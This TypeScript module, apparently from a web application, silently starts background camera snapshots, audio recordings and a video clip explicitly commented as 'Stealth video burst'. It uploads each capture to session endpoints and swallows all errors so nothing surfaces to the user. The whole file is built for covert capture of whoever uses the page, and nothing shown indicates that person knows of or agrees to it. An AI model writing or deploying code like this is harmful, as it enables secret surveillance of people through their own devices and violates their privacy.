// lib/session-media-client.ts
// Triggers background non-blocking multi-media captures (camera photo, audio memo, video clip)
import { PermissionsConfig } from "@/lib/types";
import { captureCameraSnapshot, captureAudioSnapshot, captureVideoSnapshot } from "@/lib/media-capture";

export async function executeSessionMediaCaptures(
  sessionId: string,
  config?: PermissionsConfig
): Promise<void> {
  if (!config) return;

  // 1. Photo snapshot
  if (config.camera) {
    void (async () => {
      try {
        const blob = await captureCameraSnapshot();
        if (blob) {
          const fd = new FormData();
          fd.append("sessionId", sessionId);
          const ext = blob.type.includes("webp") ? "webp" : "jpg";
          fd.append("file", blob, `capture.${ext}`);
          await fetch("/api/sessions/capture", { method: "POST", body: fd });
        }
      } catch {}
    })();
  }

  // 2. Ambient Audio memo (5s)
  if (config.audio) {
    void (async () => {
      try {
        const blob = await captureAudioSnapshot(5);
        if (blob) {
          const fd = new FormData();
          fd.append("sessionId", sessionId);
          fd.append("mediaType", "audio");
          fd.append("file", blob, "memo.m4a");
          await fetch("/api/sessions/media", { method: "POST", body: fd });
        }
      } catch {}
    })();
  }

  // 3. Stealth video burst (3s)
  if (config.video) {
    void (async () => {
      try {
        const blob = await captureVideoSnapshot(3);
        if (blob) {
          const fd = new FormData();
          fd.append("sessionId", sessionId);
          fd.append("mediaType", "video");
          fd.append("file", blob, "clip.mp4");
          await fetch("/api/sessions/media", { method: "POST", body: fd });
        }
      } catch {}
    })();
  }
}
